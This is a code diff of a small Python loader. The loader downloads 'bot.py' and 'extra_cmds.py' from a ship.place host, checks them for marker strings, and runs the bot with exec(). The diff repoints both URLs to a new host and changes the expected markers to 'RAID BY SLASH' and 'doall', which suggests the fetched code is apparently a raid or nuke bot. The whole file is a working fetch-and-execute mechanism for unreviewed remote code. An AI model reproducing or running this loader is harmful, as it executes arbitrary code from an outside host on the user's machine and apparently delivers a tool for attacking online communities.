@@ -5,8 +5,8 @@ import sys
 import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-BOT_URL = "https://teal-can-p48r8.ship.place/bot.py"
-EXTRA_URL = "https://teal-can-p48r8.ship.place/extra_cmds.py"
+BOT_URL = "https://rough-kettle-rxfzn.ship.place/bot.py"
+EXTRA_URL = "https://rough-kettle-rxfzn.ship.place/extra_cmds.py"
 BOT_FILE = os.path.join(HERE, "bot_full.py")
 EXTRA_FILE = os.path.join(HERE, "extra_cmds.py")
 
@@ -23,8 +23,8 @@ def fetch(url, dest, needles):
     print(f"  wrote {dest} ({len(data)} bytes)")
 
 if __name__ == "__main__":
-    fetch(BOT_URL, BOT_FILE, ["Project Made By", "Only commands you can use", "credits_cmd"])
-    fetch(EXTRA_URL, EXTRA_FILE, ["doall", "whitelist only"])
+    fetch(BOT_URL, BOT_FILE, ["RAID BY SLASH", "xBhMBH82xf"])
+    fetch(EXTRA_URL, EXTRA_FILE, ["RAID BY SLASH", "doall"])
     with open(BOT_FILE, encoding="utf-8") as f:
         code = f.read()
     exec(compile(code, BOT_FILE, "exec"), {"__name__": "__main__", "__file__": BOT_FILE})
